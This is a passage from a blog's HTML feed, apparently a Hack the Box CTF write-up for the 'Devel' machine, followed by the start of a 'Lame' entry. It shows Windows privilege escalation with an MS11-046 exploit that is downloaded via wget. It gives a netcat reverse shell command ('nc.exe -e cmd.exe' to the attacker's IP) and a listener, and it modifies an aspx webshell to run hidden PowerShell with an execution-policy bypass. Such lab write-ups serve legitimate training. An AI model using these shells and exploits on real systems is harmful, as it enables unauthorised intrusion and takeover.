+&lt;span class="n"&gt;ERROR&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;WINDOWS&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;System32&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;win32kfull&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;
+&lt;span class="n"&gt;ERROR&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;WINDOWS&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;System32&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;gdiplus&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dll&lt;/span&gt;
+&lt;span class="n"&gt;ERROR&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;WINDOWS&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;System32&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;coremessaging&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dll&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;There are several exploits to choose from, but we only need one good exploit.&lt;/p&gt;
+&lt;h2&gt;Web -&amp;gt; System: MS11-046&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://twitter.com/abatchy17"&gt;@abatchy&lt;/a&gt; hosts a Github repo for &lt;a href="https://github.com/abatchy17/WindowsExploits"&gt;several Windows exploits&lt;/a&gt;, one of which is for &lt;a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046"&gt;MS11-046&lt;/a&gt;.  This exploits a vulnerability in the Ancillary Function Driver to execute code as System.&lt;/p&gt;
+&lt;p&gt;Reviewing the exploit source code, I located a very pleasant feature on line 801:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="c1"&gt;// spawn shell (with elevated privileges)&lt;/span&gt;
+    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;         [*] Spawning shell&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="c1"&gt;// spawn SYSTEM shell within the current shell (remote shell friendly)&lt;/span&gt;
+    &lt;span class="n"&gt;system&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;c:&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;windows&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;system32&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;cmd.exe /K cd c:&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;windows&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;system32&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Many local exploits are more or less incompatible with remote shells; they simply don't accomodate them, typically opening a new window or the like.  They would be fine with a Remote Desktop session, but not this.&lt;/p&gt;
+&lt;p&gt;This exploit, however, states that it's compatible with remote shells; this feature is precisely the functionality that we need for this situation.&lt;/p&gt;
+&lt;p&gt;We can download the source and/or executable by using wget (preferably into the SMB directory):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# wget https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe&lt;/span&gt;
+--2020-02-17 &lt;span class="m"&gt;22&lt;/span&gt;:34:12--  https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe
+Resolving github.com &lt;span class="o"&gt;(&lt;/span&gt;github.com&lt;span class="o"&gt;)&lt;/span&gt;... &lt;span class="m"&gt;192&lt;/span&gt;.30.255.112
+Connecting to github.com &lt;span class="o"&gt;(&lt;/span&gt;github.com&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.30.255.112&lt;span class="p"&gt;|&lt;/span&gt;:443... connected.
+HTTP request sent, awaiting response... &lt;span class="m"&gt;302&lt;/span&gt; Found
+Location: https://raw.githubusercontent.com/abatchy17/WindowsExploits/master/MS11-046/MS11-046.exe &lt;span class="o"&gt;[&lt;/span&gt;following&lt;span class="o"&gt;]&lt;/span&gt;
+--2020-02-17 &lt;span class="m"&gt;22&lt;/span&gt;:34:12--  https://raw.githubusercontent.com/abatchy17/WindowsExploits/master/MS11-046/MS11-046.exe
+Resolving raw.githubusercontent.com &lt;span class="o"&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class="o"&gt;)&lt;/span&gt;... &lt;span class="m"&gt;151&lt;/span&gt;.101.128.133, &lt;span class="m"&gt;151&lt;/span&gt;.101.192.133, &lt;span class="m"&gt;151&lt;/span&gt;.101.0.133, ...
+Connecting to raw.githubusercontent.com &lt;span class="o"&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;151&lt;/span&gt;.101.128.133&lt;span class="p"&gt;|&lt;/span&gt;:443... connected.
+HTTP request sent, awaiting response... &lt;span class="m"&gt;200&lt;/span&gt; OK
+Length: &lt;span class="m"&gt;112815&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;110K&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/octet-stream&lt;span class="o"&gt;]&lt;/span&gt;
+Saving to: ‘MS11-046.exe’
+
+MS11-046.exe                           &lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[==========================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;110&lt;/span&gt;.17K  --.-KB/s    in &lt;span class="m"&gt;0&lt;/span&gt;.05s
+
+&lt;span class="m"&gt;2020&lt;/span&gt;-02-17 &lt;span class="m"&gt;22&lt;/span&gt;:34:13 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.31 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - ‘MS11-046.exe’ saved &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;112815&lt;/span&gt;/112815&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Running it on the server:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="And! ... Nothing." src="images/ctf/htb/devel/privesc_exploit_failed.png"&gt;&lt;/p&gt;
+&lt;p&gt;No elevated shell...  It appears that the exploit worked and executed the elevated code, so what gives?&lt;/p&gt;
+&lt;p&gt;My theory is that the &lt;code&gt;Invoke-PowerShellTcp&lt;/code&gt; function isn't compatible with the exploit.  To test, I located &lt;code&gt;nc.exe&lt;/code&gt;, a netcat Windows binary, and set up a new reverse shell through ncat.&lt;/p&gt;
+&lt;p&gt;In a new terminal on Kali:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# rlwrap ncat -nvlp 4444&lt;/span&gt;
+Ncat: Version &lt;span class="m"&gt;7&lt;/span&gt;.80 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class="o"&gt;)&lt;/span&gt;
+Ncat: Listening on :::4444
+Ncat: Listening on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:4444
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In the Windows shell:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;\\&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;14&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;22&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;nc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt; &lt;span class="n"&gt;-e&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt; &lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;14&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;22&lt;/span&gt; &lt;span class="n"&gt;4444&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Back to the new listener:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Ncat&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Connection&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;span class="n"&gt;Ncat&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Connection&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;5&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;49191&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;span class="n"&gt;Microsoft&lt;/span&gt; &lt;span class="n"&gt;Windows&lt;/span&gt; &lt;span class="no"&gt;[Version 6.1.7600]&lt;/span&gt;
+&lt;span class="n"&gt;Copyright&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;2009&lt;/span&gt; &lt;span class="n"&gt;Microsoft&lt;/span&gt; &lt;span class="n"&gt;Corporation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="n"&gt;All&lt;/span&gt; &lt;span class="n"&gt;rights&lt;/span&gt; &lt;span class="n"&gt;reserved&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;windows&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;system32&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;inetsrv&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now we have a 'pure' netcat reverse shell.  Executing the exploit again,&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="images/ctf/htb/devel/get_system.png"&gt;&lt;/p&gt;
+&lt;p&gt;My theory appears to have been correct!  From here, it is trivially easy to locate and read from the flag files.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Both 32 bytes long, the length of an MD5 hash" src="images/ctf/htb/devel/list_flags.png"&gt;&lt;/p&gt;
+&lt;p&gt;This concludes the Devel writeup, and any further content is expanding on the above.&lt;/p&gt;
+&lt;p&gt;Thank you for reading!&lt;/p&gt;
+&lt;h2&gt;Modifying the aspx webshell for PowerShell execution&lt;/h2&gt;
+&lt;p&gt;To modify the webshell to execute PowerShell as a default, simply replace lines 11 and 12:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;psi.FileName = &amp;quot;cmd.exe&amp;quot;;&lt;/span&gt;
+&lt;span class="err"&gt;psi.Arguments = &amp;quot;/c &amp;quot;+arg;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;With:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;psi.FileName = &amp;quot;powershell.exe&amp;quot;;&lt;/span&gt;
+&lt;span class="err"&gt;psi.Arguments = &amp;quot;-NoP -NonI -W Hidden -Exec Bypass \&amp;quot;&amp;quot;+arg+&amp;quot;\&amp;quot;&amp;quot;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;PowerShell execution brings with it a massive improvement of usability and functionality; we can do practically anything in the Windows environment.  This isn't strictly necessary, but could be useful.&lt;/p&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="hack the box"></category><category term="oscp prep"></category></entry><entry><title>Lame - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-lame.html" rel="alternate"></link><published>2020-02-13T00:00:00-08:00</published><updated>2020-02-13T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-lame.html,2020-02-13:</id><summary type="html">&lt;p&gt;Guide to Lame on Hack the Box.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
 &lt;p&gt;Lame is one of the easiest boxes overall, with a Samba SMB server exploit to instant root and a red herring.&lt;/p&gt;
 &lt;p&gt;Lame is assigned IP 10.10.10.3.&lt;/p&gt;
 &lt;h2&gt;Reconnaissance&lt;/h2&gt;
